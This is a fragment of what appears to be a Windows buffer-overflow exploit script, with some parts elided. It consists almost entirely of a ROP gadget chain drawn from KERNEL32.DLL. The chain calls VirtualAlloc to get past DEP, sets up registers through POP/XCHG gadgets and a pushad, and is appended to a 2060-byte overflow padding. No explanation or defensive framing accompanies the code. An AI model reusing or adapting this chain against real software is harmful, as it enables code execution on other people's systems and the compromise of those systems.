...
rop_gadgets = [
      ...
      0x75d01283,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75d6156c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75d0127e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75cfc7db,  # XCHG EAX,ESI # ADC EAX,E58B0000 # POP EBP # RETN 0x10 [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x75d3cc53,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x75d0065f,  # & jmp esp [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x75d26cbb,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x75d53495,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      0x75d555e1,  # XCHG EDX,EDI # DEC ECX # RETN 0x10 [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75cfdc67,  # POP ECX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      ...
      0x75d222f4,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75d2b181,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75cfb812,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
...
buf  = b"A" * 2060
#buf += pack("<I", 0x75d280ba)
#buf += rop # bp = retn # 000C1877
buf += rop_gadgets
